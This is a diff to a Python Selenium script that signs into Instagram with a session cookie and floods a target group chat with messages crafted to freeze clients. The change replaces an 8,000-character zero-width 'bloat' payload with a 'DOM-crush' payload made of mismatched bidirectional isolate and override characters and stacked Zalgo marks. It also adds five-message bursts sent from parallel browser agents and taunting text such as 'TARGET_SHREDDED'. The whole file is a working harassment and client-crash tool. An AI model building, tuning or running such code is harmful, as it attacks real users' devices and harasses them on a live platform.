@@ -1,6 +1,6 @@
 # -*- coding: utf-8 -*-
-# 🚀 PROJECT: PRAVEER NC (8000 BLOAT EDITION)
-# 📅 STATUS: RED-LINE IMPACT | DYNAMIC NAME
+# 🚀 PROJECT: PRAVEER NC (DOM-CRUSH EDITION)
+# 📅 STATUS: ISOLATE LAYERING | BURST MODE | 10 AGENTS
 
 import os, time, random, threading, sys, gc, tempfile, shutil
 from concurrent.futures import ThreadPoolExecutor
@@ -11,28 +11,31 @@ from selenium.webdriver.chrome.options import Options
 
 # --- CONFIG ---
 THREADS = 2
-SESSION_LIMIT = 120 
+SESSION_LIMIT = 150 
 MACHINE_ID = os.getenv("MACHINE_ID", "1")
 
-def get_max_payload(target_display_name):
-    """The Red-Line Payload: 8,000 character bloat + Skyscrapers."""
+def get_dom_crush_payload(target_name):
+    """Generates the high-intensity Isolate Layering payload."""
     header = "👑 PRAVEER PAPA 👑\n"
-    sub_header = f"SYSTEM ERROR: [{target_display_name.upper()}] HAS BEEN OWNED\n"
+    sub_header = f"SYSTEM ERROR: [{target_name.upper()}] OWNED\n"
     
-    direction_chaos = ("\u202E" + "\u202D") * 150 
-    z_tower = "̸" * 120
-    # 💥 RED-LINE BLOAT (8,000 chars)
-    bloat = "".join(random.choice(["\u200B", "\u200D", "\u2060"]) for _ in range(8000))
+    # 💥 THE 'LAYOUT KILLER' (Mismatched Isolate Overrides)
+    # Forces the browser to calculate nested direction layers
+    chaos = "\u202E\u202D\u2066\u2067" * 45 
     
-    lines = [header, sub_header, bloat]
-    for _ in range(60):
-        lines.append(direction_chaos + f"{target_display_name.upper()}_OWNED" + z_tower)
+    # 💥 THE 'RENDER STACK' (Triple-Type Zalgo)
+    zalgo_stack = "̸" * 30 + "̰" * 30 + "̵" * 30
     
-    lines.append(bloat + "\n🛑 SYSTEM UNRESPONSIVE 🛑")
-    return "\n".join(lines)
-
-def log_status(agent_id, msg):
-    print(f"[M{MACHINE_ID}-A{agent_id}] {msg}", flush=True)
+    # 💥 THE 'FREEZER' (Mismatched tags)
+    freezer = "\u2068" * 80 + "\u2069" * 80 
+    
+    lines = [header, sub_header, freezer]
+    for i in range(40):
+        pattern = chaos if i % 2 == 0 else chaos[::-1]
+        lines.append(f"{pattern} {target_name.upper()}_SHREDDED {zalgo_stack}")
+    
+    payload = "\n".join(lines)
+    return payload[:9500] 
 
 def get_driver(agent_id):
     chrome_options = Options()
@@ -40,15 +43,15 @@ def get_driver(agent_id):
     chrome_options.add_argument("--no-sandbox")
     chrome_options.add_argument("--disable-dev-shm-usage")
     chrome_options.add_argument("--window-size=1920,1080")
-    chrome_options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36")
+    chrome_options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36")
     return webdriver.Chrome(options=chrome_options)
 
-def run_life_cycle(agent_id, cookie, target_id, target_display_name):
+def run_life_cycle(agent_id, cookie, target_id, target_name):
     while True:
         driver = None
         session_start = time.time()
         try:
-            log_status(agent_id, "🚀 DEPLOYING RED-LINE AGENT...")
+            print(f"[M{MACHINE_ID}-A{agent_id}] 🚀 DEPLOYING DOM-CRUSH AGENT...")
             driver = get_driver(agent_id)
             driver.get("https://www.instagram.com/")
             driver.add_cookie({'name': 'sessionid', 'value': cookie, 'path': '/', 'domain': '.instagram.com'})
@@ -60,28 +63,41 @@ def run_life_cycle(agent_id, cookie, target_id, target_display_name):
             while (time.time() - session_start) < SESSION_LIMIT:
                 try:
                     box = driver.find_element(By.XPATH, "//div[@role='textbox'] | //textarea")
-                    driver.execute_script("""
-                        var el = arguments[0];
-                        document.execCommand('insertText', false, arguments[1]);
-                        el.dispatchEvent(new Event('input', { bubbles: true }));
-                    """, box, get_max_payload(target_display_name))
-                    box.send_keys(Keys.ENTER)
-                    log_status(agent_id, f"🔥 IMPACT SENT | {target_display_name.upper()} FREEZING")
-                    time.sleep(0.8)
-                except: time.sleep(3)
+                    
+                    # 🔥 BURST MODE: Send 5 in a row to create a "Lag Spike"
+                    for _ in range(5):
+                        payload = get_dom_crush_payload(target_name)
+                        driver.execute_script("""
+                            var el = arguments[0];
+                            document.execCommand('insertText', false, arguments[1]);
+                            el.dispatchEvent(new Event('input', { bubbles: true }));
+                        """, box, payload)
+                        box.send_keys(Keys.ENTER)
+                        time.sleep(0.1) 
+                    
+                    print(f"[M{MACHINE_ID}-A{agent_id}] 💥 BURST DELIVERED | {target_name.upper()} CRUSHED")
+                    
+                    # COOL-DOWN: Wait for server to breath before next spike
+                    time.sleep(random.uniform(8, 12)) 
+                    
+                except Exception as e:
+                    time.sleep(5)
+                    break 
         except Exception: pass
         finally:
             if driver: driver.quit()
             gc.collect()
-            time.sleep(2)
+            time.sleep(3)
 
 def main():
     cookie = os.environ.get("SESSION_ID", "").strip()
     target_id = os.environ.get("GROUP_URL", "").strip()
     target_name = os.environ.get("TARGET_NAME", "Target").strip()
     if not cookie or not target_id: sys.exit(1)
+    
     with ThreadPoolExecutor(max_workers=THREADS) as executor:
-        for i in range(THREADS): executor.submit(run_life_cycle, i+1, cookie, target_id, target_name)
+        for i in range(THREADS):
+            executor.submit(run_life_cycle, i+1, cookie, target_id, target_name)
 
 if __name__ == "__main__":
     main()
